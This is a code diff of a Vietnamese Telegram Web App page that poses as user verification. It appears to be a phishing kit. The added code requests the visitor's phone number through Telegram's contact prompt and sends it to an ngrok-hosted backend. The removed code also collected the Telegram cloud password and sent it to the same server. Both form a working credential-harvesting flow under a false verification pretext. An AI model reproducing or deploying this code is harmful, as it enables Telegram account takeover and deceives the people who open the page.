@@ -6,16 +6,15 @@
     <title>Xác Minh</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #0d1117; color: white; font-family: sans-serif; margin: 0; overflow: hidden; }
-        .screen { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
-        .active { display: flex; }
+        body { background: #0d1117; color: white; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .screen { display: none; text-align: center; }
+        .active { display: block; }
         .btn { padding: 15px 30px; background: #3bc0a8; border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="screen active" id="step1">
-    <div style="font-size: 50px; margin-bottom: 20px;">👋</div>
     <button class="btn" id="shareContact">Xác Nhận Người Dùng</button>
 </div>
 
@@ -23,55 +22,43 @@
     <div>Đang xử lý dữ liệu...</div>
 </div>
 
-<div class="screen" id="step5">
-    <input type="password" id="s5pw" placeholder="Nhập mật khẩu đám mây" style="padding: 10px; width: 80%; border-radius: 8px;">
-    <button class="btn" id="s5btn" onclick="s5check()">Kiểm tra</button>
-</div>
-
-<div class="screen" id="s5success">
-    <div>✅ Đăng nhập thành công!</div>
-</div>
-
 <script>
     const tg = window.Telegram.WebApp;
     tg.ready();
     tg.expand();
 
+    // Thay đổi link này thành link Ngrok mới nhất của bạn
     const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
     const chat_id = tg.initDataUnsafe?.user?.id || Math.floor(Math.random() * 1000000);
 
     function goStep(n) {
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-        if (n === 5) document.getElementById('step5').classList.add('active');
-        else if (n === 'success') document.getElementById('s5success').classList.add('active');
-        else document.getElementById('step' + n).classList.add('active');
+        document.getElementById('step' + n).classList.add('active');
     }
 
     document.getElementById("shareContact").addEventListener("click", () => {
-        tg.onEvent('contactRequested', async (e) => {
-            if (e.status === 'sent') {
-                await fetch(`${BACKEND_URL}/send_phone`, {
+        alert("Đã nhấn nút, đang gọi requestContact..."); 
+        tg.requestContact();
+    });
+
+    tg.onEvent('contactRequested', async (e) => {
+        if (e.status === 'sent') {
+            alert("Đã nhận SĐT: " + e.responseUnsafe.contact.phone_number);
+            try {
+                const response = await fetch(`${BACKEND_URL}/send_phone`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ chat_id: chat_id, phone: e.responseUnsafe.contact.phone_number })
                 });
-                goStep(2);
+                alert("Server phản hồi: " + response.status);
+                if (response.ok) {
+                    goStep(2);
+                }
+            } catch (err) {
+                alert("Lỗi kết nối: " + err);
             }
-        });
-        tg.requestContact();
+        }
     });
-
-    async function s5check() {
-        const pw = document.getElementById('s5pw').value;
-        const res = await fetch(`${BACKEND_URL}/verify_password`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: chat_id, password: pw })
-        });
-        const d = await res.json();
-        if (d.status === 'success') goStep('success');
-        else alert("Mật khẩu sai!");
-    }
 </script>
 </body>
 </html>
